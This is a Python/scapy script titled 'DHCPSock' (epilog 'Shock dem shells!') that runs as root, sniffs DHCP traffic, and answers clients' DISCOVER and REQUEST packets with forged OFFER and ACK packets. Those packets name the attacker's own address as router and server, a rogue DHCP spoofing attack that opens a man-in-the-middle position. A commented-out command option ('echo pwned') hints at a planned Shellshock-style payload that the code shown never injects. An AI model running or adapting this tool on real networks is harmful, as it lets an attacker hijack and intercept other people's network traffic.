#! /usr/bin/env python

import binascii
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy

from scapy.all import *

parser = argparse.ArgumentParser(description='DHCPSock', epilog='Shock dem shells!')
parser.add_argument('-i', '--iface', type=str, required=True, help='Interface to use')
#parser.add_argument('-c', '--cmd', type=str, help='Command to execute [default: "echo pwned"]')

args = parser.parse_args()

# command = args.cmd or "echo 'pwned'"

if os.geteuid() != 0:
    sys.exit("Run me as root")



#BOOTP
#siaddr = DHCP server ip
#yiaddr = ip offered to client
#xid = transaction id 
#giaddr = gateway
#chaddr = clients mac address in binary format

my_ip = "172.20.57.9"
fake_ip = "172.20.57.4"


def dhcp_offer(raw_mac, xid):
	print "***** SENDING DHCP OFFER *****"
	ether = Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') 
	ip = IP(src=my_ip, dst='255.255.255.255') 
	udp = UDP(sport=67, dport=68) 
	bootp = BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_ip, giaddr = my_ip,siaddr= my_ip, xid=xid) 
	dhcp = DHCP(options=[("message-type", "offer"),
		('server_id', my_ip),
		('subnet_mask', '255.255.248.0 '),
		('router', my_ip),
		('lease_time', 172800),
		('renewal_time', 86400),
		('rebinding_time', 138240),
		"end"])
	packet = ether/ip/udp/bootp/dhcp

	#print packet.show()
	return packet


def dhcp_ack(raw_mac, xid):
	print "***** SENDING DHCP ACK *****"
	ether = Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') 
	ip = IP(src=my_ip, dst='255.255.255.255') 
	udp = UDP(sport=67, dport=68) 
	bootp = BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_ip, giaddr = my_ip, siaddr= my_ip, xid=xid) 
	dhcp = DHCP(options=[("message-type", "ack"),
		('server_id', my_ip),
		('subnet_mask', '255.255.248.0 '),
		('router', my_ip),
		('lease_time', 172800),
		('renewal_time', 86400),
		('rebinding_time', 138240),
		"end"])

	packet = ether/ip/udp/bootp/dhcp
	#print packet.show()
	return packet


def dhcp(resp):
	if resp.haslayer(DHCP):
		mac_addr = resp[Ether].src
		raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

		if resp[DHCP].options[0][1] == 1:
			xid = resp[BOOTP].xid
			print "************* Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid)
			print "************* Sending OFFER *************"
			packet = dhcp_offer(raw_mac, xid)
			#packet.plot(lambda x:len(x))
			#packet.pdfdump("offer.pdf")
			#print hexdump(packet)
			print packet.show()
			sendp(packet, iface=args.iface)

		if resp[DHCP].options[0][1] == 3:
			xid = resp[BOOTP].xid
			print "************* Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid)
			print "************* Sending ACK *************"
			packet = dhcp_ack(raw_mac, xid)
			#packet.pdfdump("ack.pdf")
			#print hexdump(packet)
			print packet.show()
			sendp(packet, iface=args.iface)

print "************* Waiting for a DISCOVER *************"
sniff(filter="udp and (port 67 or 68)", prn=dhcp, iface=args.iface)

#sniff(filter="udp and port 53", prn=dhcp, iface=args.iface)
#print sniff
#sniff(filter="udp and (port 67 or 68)", prn=dhcp)
